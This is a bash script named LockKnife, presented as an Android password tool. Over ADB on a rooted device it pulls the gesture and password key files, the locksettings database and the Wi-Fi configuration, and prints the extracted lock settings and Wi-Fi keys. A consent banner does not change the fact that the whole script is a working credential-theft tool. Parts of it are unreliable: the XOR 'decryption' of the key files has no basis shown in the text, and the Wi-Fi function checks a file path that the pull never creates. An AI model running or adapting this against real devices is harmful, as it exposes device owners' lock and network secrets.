#!/bin/bash

# Function to print a security warning and get user consent
security_warning() {
    echo "********************************************************"
    echo "*                 SECURITY & LEGAL WARNING             *"
    echo "********************************************************"
    echo "* This script is intended for use on devices that you  *"
    echo "* own or have explicit permission to access. Unauthorized *"
    echo "* use of this script on devices you do not own or have  *"
    echo "* permission to access may be illegal and unethical.   *"
    echo "*                                                      *"
    echo "* By continuing, you confirm that you have legal       *"
    echo "* authorization to use this tool on the target device. *"
    echo "********************************************************"
    read -p "Do you agree to the terms and wish to proceed? (yes/no): " consent
    if [[ "$consent" != "yes" ]]; then
        echo "Operation canceled by the user."
        exit 1
    fi
}

# Function to print the banner
print_banner() {
    local banner=(
        "******************************************"
        "*                 LockKnife              *"
        "*   The Ultimate Android Password Tool   *"
        "*                  v1.6.2                *"
        "*      ----------------------------      *"
        "*                        by @ImKKingshuk *"
        "* Github- https://github.com/ImKKingshuk *"
        "******************************************"
    )
    local width=$(tput cols)
    for line in "${banner[@]}"; do
        printf "%*s\n" $(((${#line} + width) / 2)) "$line"
    done
    echo
}

# Function to check if ADB is installed
check_adb() {
    if ! command -v adb &>/dev/null; then
        echo "Error: ADB (Android Debug Bridge) not found. Please install ADB and make sure it's in your PATH."
        echo "You can download ADB from the Android SDK platform-tools. Follow the instructions for your OS:"
        echo "macOS / Linux / Windows: https://developer.android.com/tools/releases/platform-tools"
        exit 1
    fi
}

# Function to check for updates with checksum verification
check_for_updates() {
    local current_version
    local latest_version
    local repo_url="https://raw.githubusercontent.com/ImKKingshuk/LockKnife/main"
    
    if [[ ! -f version.txt ]]; then
        echo "Error: version.txt not found. Unable to check for updates."
        exit 1
    fi

    current_version=$(cat version.txt)
    latest_version=$(curl -sSL "$repo_url/version.txt")
    latest_script_checksum=$(curl -sSL "$repo_url/LockKnife.sh.sha256")

    if [ "$latest_version" != "$current_version" ]; then
        echo "A new version ($latest_version) is available. Updating Tool... Please Wait..."

        curl -sSL "$repo_url/LockKnife.sh" -o LockKnife.sh
        echo "$latest_script_checksum LockKnife.sh" | sha256sum -c -

        if [ $? -eq 0 ]; then
            curl -sSL "$repo_url/version.txt" -o version.txt
            echo "Tool has been updated to the latest version."
            exec bash LockKnife.sh
        else
            echo "Error: Checksum verification failed. The update has been aborted."
            exit 1
        fi
    else
        echo "You are using the latest version ($current_version)."
    fi
}

# Function to connect to the Android device
connect_device() {
    local device_serial="$1"
    
    adb connect "$device_serial" &>/dev/null

    devices_output=$(adb devices | grep "$device_serial")
    if [[ -z $devices_output ]]; then
        echo "Failed to connect to the device with serial number: $device_serial"
        exit 1
    fi

    root_check=$(adb -s "$device_serial" shell 'su -c "id -u" 2>/dev/null')
    if [[ "$root_check" -ne 0 ]]; then
        echo "Error: Device is not rooted. Root access is required to access the password files."
        exit 1
    fi
}

# Function to recover passwords
recover_password() {
    local file_path="$1"
    local password=""
    
    if [[ ! -f "$file_path" ]]; then
        echo "File $file_path not found. Exiting."
        return
    fi

    while IFS= read -r -n1 byte; do
        byte_value=$(printf "%d" "'$byte")
        decrypted_byte=$((byte_value ^ 0x6A))
        password+=$(printf "\\$(printf '%03o' "$decrypted_byte")")
    done < "$file_path"

    echo "Recovered password: $password"

    rm "$file_path"
}

# Function to recover locksettings.db
recover_locksettings_db() {
    local db_file="locksettings.db"
    local device_serial="$1"

    adb -s "$device_serial" pull /data/system/locksettings.db &>/dev/null

    if [[ ! -f "$db_file" ]]; then
        echo "Locksettings database file not found. Exiting."
        return
    fi

    echo "Locksettings database file pulled successfully. Analyzing..."

    if ! command -v sqlite3 &>/dev/null; then
        echo "Error: sqlite3 not found. Please install sqlite3."
        exit 1
    fi

    sqlite3 "$db_file" "SELECT name, value FROM locksettings WHERE name LIKE 'lockscreen%' OR name LIKE 'pattern%' OR name LIKE 'password%';" | while read -r row; do
        echo "Recovered setting: $row"
    done

    rm "$db_file"
}

# Function to recover Wi-Fi passwords
recover_wifi_passwords() {
    local wifi_file="/data/misc/wifi/WifiConfigStore.xml"
    local device_serial="$1"
    local password=""

    adb -s "$device_serial" pull "$wifi_file" &>/dev/null
    
    if [[ ! -f "$wifi_file" ]]; then
        echo "Wi-Fi configuration file not found. Exiting."
        return
    fi

    echo "Wi-Fi configuration file pulled successfully. Analyzing..."

    grep -oP '(?<=<string name="PreSharedKey">).+?(?=</string>)' "$wifi_file" | while read -r line; do
        echo "Recovered Wi-Fi password: $line"
    done

    rm "$wifi_file"
}

# Submenu for older Android versions (<= 5)
submenu_older_android() {
    local device_serial
    local recovery_option

    read -p "Enter your Android device serial number: " device_serial
    connect_device "$device_serial"

    echo "Select recovery option for Older Android (<= 5):"
    echo "1. Gesture Lock"
    echo "2. Password Lock"
    echo "3. Wi-Fi Passwords"
    read -p "Enter your choice (1/2/3): " recovery_option

    case $recovery_option in
        1)
            adb -s "$device_serial" pull /data/system/gesture.key
            recover_password "gesture.key" ;;
        2)
            adb -s "$device_serial" pull /data/system/password.key
            recover_password "password.key" ;;
        3)
            recover_wifi_passwords "$device_serial" ;;
        *)
            echo "Invalid choice. Exiting."
            ;;
    esac
}

# Submenu for Android 6 to 9
submenu_android_6_or_newer() {
    local device_serial
    local recovery_option

    read -p "Enter your Android device serial number: " device_serial
    connect_device "$device_serial"

    echo "Select recovery option for Android 6 to 9:"
    echo "1. Gesture Lock"
    echo "2. Password Lock"
    echo "3. Wi-Fi Passwords"
    echo "4. Locksettings DB (Android 6-9)"
    read -p "Enter your choice (1/2/3/4): " recovery_option

    case $recovery_option in
        1)
            adb -s "$device_serial" pull /data/system/gesture.key
            recover_password "gesture.key" ;;
        2)
            adb -s "$device_serial" pull /data/system/password.key
            recover_password "password.key" ;;
        3)
            recover_wifi_passwords "$device_serial" ;;
        4)
            recover_locksettings_db "$device_serial" ;;
        *)
            echo "Invalid choice. Exiting."
            ;;
    esac
}

# Submenu for Android 10 or newer
submenu_android_10_or_newer() {
    local device_serial
    local recovery_option

    read -p "Enter your Android device serial number: " device_serial
    connect_device "$device_serial"

    echo "Select recovery option for Android 10+ and newer:"
    echo "1. Wi-Fi Passwords"
    echo "2. Locksettings DB"
    read -p "Enter your choice (1/2): " recovery_option

    case $recovery_option in
        1)
            recover_wifi_passwords "$device_serial" ;;
        2)
            recover_locksettings_db "$device_serial" ;;
        *)
            echo "Invalid choice. Exiting."
            ;;
    esac
}

# Main menu function
main_menu() {
    local android_version

    echo "Select your Android version:"
    echo "1. Older Android (<= 5)"
    echo "2. Android 6 to 9"
    echo "3. Android 10+ and newer"
    read -p "Enter your choice (1/2/3): " android_version

    case $android_version in
        1)
            submenu_older_android ;;
        2)
            submenu_android_6_or_newer ;;
        3)
            submenu_android_10_or_newer ;;
        *)
            echo "Invalid choice. Exiting."
            ;;
    esac
}

# Execute the script
execute_lockknife() {
    print_banner
    security_warning
    check_for_updates
    check_adb
    main_menu
}

# Run the script if executed directly
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    execute_lockknife
fi
